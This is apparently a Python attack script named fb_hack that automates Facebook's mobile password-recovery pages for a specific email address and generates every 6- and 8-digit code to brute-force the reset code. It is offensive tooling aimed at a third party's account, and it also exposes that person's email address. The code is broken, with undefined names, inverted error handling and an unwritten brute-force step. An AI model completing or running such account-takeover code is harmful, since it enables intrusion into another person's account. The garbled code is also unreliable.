import itertools
import sys
from time import sleep
from bs4 import BeautifulSoup
import requests
import mechanize
import os
CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def passcode6():
  try:
    f = open("6digits.txt", "a")
    f.close()
  except:
    f = open("6digits.txt", "a+")
    for combination in itertools.product(range(10), repeat=6):
        f.write(''.join(map(str, combination)))
  try:
    z = open("8digits.txt", "a")
    z.close()
  except:
    z = open("8digits.txt", "a+")
    for combination in itertools.product(range(10), repeat=8):
      z.write(''.join(map(str, combination)))

def sleepy(counter):
  x = counter
  y = 0
  while x > y:
    x -= 1
    z = x
    if x <= 9:
      code = ("0", str(z))
      yo = h.join(code)
      x 
      print(yo, end='\r')
    else:
      print(x, end='\r')
    sleep(1)

def fb_hack(email, codex):
  soup = BeautifulSoup()
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
  browser.set_cookiejar(cookies)
  browser.addheaders = [('User-agent', MOZILLA_UAS)]
  browser.set_handle_refresh(False)
  browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
  try:
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    print("1")
    with open("outputx.html", "w") as file:
      file.write(str(soup))
    browser.click_link(nr=0)
  except:
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    print("1")
    with open("output1.html", "w") as file:
      file.write(str(soup))
    sys.exit()
  try:
    browser.form['email'] = email
    browser.submit()
  except:
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    print("1")
    with open("output1.html", "w") as file:
      file.write(str(soup))
    print(browser.find_link())
    forms = list(browser.forms())
    print(forms)
    print(list.all())
    sys.exit()
  """selection confirmation"""
  try:
    browser.select_form(nr=0)
    browser.submit()
  except:
    print(browser.geturl())
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    with open("output2.html", "w") as file:
      file.write(str(soup))
    print("2")
    sys.exit()
  try:
    browser.select_form(nr=0)
    browser.submit()
  except:
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    with open("output3.html", "w") as file:
      file.write(string(soup))
    print("3")
    sys.exit()
  try:
    browser.select_form(nr=0)
    browser.submit()
  except:
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    Iprint(soup.find(string("Facebook is not available on this browser")))
    with open("output4.html", "w") as file:
      file.write(str(soup))
    print("4")
    sys.exit()
  """reset code input"""

os.system('clear')
passcode6()

ehack = str("amschwab@comcast.net")
reset = int(99999999)
fb_hack(ehack, reset)
